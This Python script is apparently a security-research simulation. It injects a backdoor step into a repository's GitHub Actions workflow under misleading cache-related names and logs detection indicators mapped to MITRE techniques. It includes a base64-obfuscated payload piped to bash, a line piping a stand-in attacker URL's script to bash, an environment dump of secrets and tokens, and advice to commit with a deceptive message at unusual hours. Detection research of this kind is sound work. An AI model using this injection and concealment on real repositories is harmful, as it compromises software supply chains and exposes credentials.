#!/usr/bin/env python3
"""
Attack Scenario 2.1: Backdoor in CI/CD Pipeline
================================================

Simulates malicious code injection into workflow that exfiltrates environment variables.

RESEARCH ONLY - Academic purposes, controlled environment.
"""

import os
import sys
import json
from pathlib import Path
from datetime import datetime
import base64


class PipelineBackdoorAttack:
    """Simulates pipeline backdoor attack."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci.yml"
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def inject_backdoor(self, obfuscated=False):
        """Inject backdoor into workflow."""
        print(f"[*] Injecting pipeline backdoor (obfuscated={obfuscated})...")

        if not self.workflow_file.exists():
            print(f"[!] Workflow not found: {self.workflow_file}")
            return False

        # Backup
        backup = self.workflow_file.parent / f"ci.yml.backup.{self.backup_suffix}"
        with open(self.workflow_file, 'r') as f:
            original = f.read()
        with open(backup, 'w') as f:
            f.write(original)

        if obfuscated:
            # Obfuscated version (harder to detect)
            backdoor_code = base64.b64encode(b'''
echo "[ATTACK] Environment exfiltration simulation"
env | grep -E "(SECRET|TOKEN|PASSWORD|KEY)" || true
echo "ATTACK_INDICATOR: env_variable_exfiltration=simulated"
''').decode()

            injection = f'''
      # RESEARCH ATTACK: Obfuscated backdoor
      - name: Setup cache configuration
        run: |
          echo "[*] Configuring build cache..."
          echo "{backdoor_code}" | base64 -d | bash || true
'''
        else:
            # Clear version (easier to detect)
            injection = '''
      # RESEARCH ATTACK: Pipeline backdoor
      - name: Update dependency cache
        run: |
          echo "[ATTACK] Simulating malicious script execution"
          # Simulate downloading external script
          echo "curl -s http://attacker-example.com/backdoor.sh | bash" || true

          # Simulate environment variable exfiltration
          echo "[ATTACK] Simulating env variable collection"
          env | grep -E "(SECRET|TOKEN|PASSWORD|KEY)" > /tmp/exfil.txt || true
          echo "[ATTACK] Would exfiltrate $(wc -l < /tmp/exfil.txt 2>/dev/null || echo 0) environment variables"
          rm -f /tmp/exfil.txt

          # Log indicators
          echo "ATTACK_INDICATOR: external_url=attacker-example.com"
          echo "ATTACK_INDICATOR: env_dumping=true"
          echo "ATTACK_INDICATOR: curl_usage=true"
'''

        # Inject into workflow
        lines = original.split('\n')
        injected = False

        for i, line in enumerate(lines):
            if 'uses: actions/checkout@' in line:
                j = i + 1
                while j < len(lines) and lines[j].startswith(' ' * 6):
                    j += 1
                lines.insert(j, injection)
                injected = True
                break

        if not injected:
            print("[!] Could not find injection point")
            return False

        with open(self.workflow_file, 'w') as f:
            f.write('\n'.join(lines))

        print(f"[OK] Backdoor injected (obfuscated={obfuscated})")
        return True

    def log_indicators(self, obfuscated=False):
        """Log behavioral indicators."""
        indicators = {
            "attack_type": "pipeline_backdoor",
            "scenario_id": "2.1",
            "timestamp": datetime.now().isoformat(),
            "obfuscated": obfuscated,
            "indicators": {
                "workflow_file_modified": True,
                "modification_type": "new_step_added",
                "contains_curl": not obfuscated,
                "contains_wget": False,
                "external_urls": ["http://attacker-example.com/backdoor.sh"] if not obfuscated else [],
                "base64_encoded_content": obfuscated,
                "environment_variable_access": True,
                "env_variable_patterns": ["SECRET", "TOKEN", "PASSWORD", "KEY"],
                "pipe_to_bash": not obfuscated,
                "suspicious_step_name": "Update dependency cache",
                "step_name_mismatch": True  # Name doesn't match behavior
            },
            "expected_detection": {
                "difficulty": "hard" if obfuscated else "medium",
                "primary_signals": [
                    "workflow_modification",
                    "external_url" if not obfuscated else "base64_content",
                    "env_dumping"
                ],
                "secondary_signals": [
                    "curl_wget_usage",
                    "pipe_to_bash",
                    "step_name_anomaly"
                ]
            },
            "commit_metadata": {
                "suggested_commit_message": "Update dependencies caching",
                "commit_time": "unusual_hours",
                "files_modified": [".github/workflows/ci.yml"],
                "lines_added": 10,
                "lines_removed": 0
            },
            "mitre_attack": {
                "technique": "T1554",
                "name": "Compromise Software Supply Chain",
                "sub_technique": "T1059",
                "sub_name": "Command and Scripting Interpreter",
                "tactic": "Execution"
            }
        }

        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        log_file = log_dir / f"pipeline_backdoor_{self.backup_suffix}.json"
        with open(log_file, 'w') as f:
            json.dump(indicators, f, indent=2)

        print(f"[OK] Indicators logged: {log_file}")
        return indicators

    def execute(self, obfuscated=False):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 2.1: Pipeline Backdoor")
        print("=" * 80)
        print(f"\nObfuscation level: {'HIGH' if obfuscated else 'LOW'}")
        print("[!] RESEARCH ONLY - Controlled environment\n")

        if not self.inject_backdoor(obfuscated):
            print("\n[FAIL] Injection failed")
            return False

        indicators = self.log_indicators(obfuscated)

        print("\n" + "=" * 80)
        print("ATTACK EXECUTION SUMMARY")
        print("=" * 80)
        print(f"Status: SUCCESS")
        print(f"Obfuscated: {obfuscated}")
        print(f"Detection Difficulty: {indicators['expected_detection']['difficulty']}")
        print(f"\nKey Indicators:")
        for sig in indicators['expected_detection']['primary_signals']:
            print(f"  - {sig}")

        print(f"\nSuggested commit message:")
        print(f'  "{indicators["commit_metadata"]["suggested_commit_message"]}"')
        print(f"\nNext Steps:")
        print(f"  1. Review changes: git diff")
        print(f"  2. Commit with realistic message")
        print(f"  3. Push and trigger workflow")
        print(f"  4. Monitor for execution and collect results")
        print("=" * 80)

        return True


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--obfuscated', action='store_true',
                       help='Use obfuscated version (harder to detect)')
    args = parser.parse_args()

    attack = PipelineBackdoorAttack()
    success = attack.execute(obfuscated=args.obfuscated)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
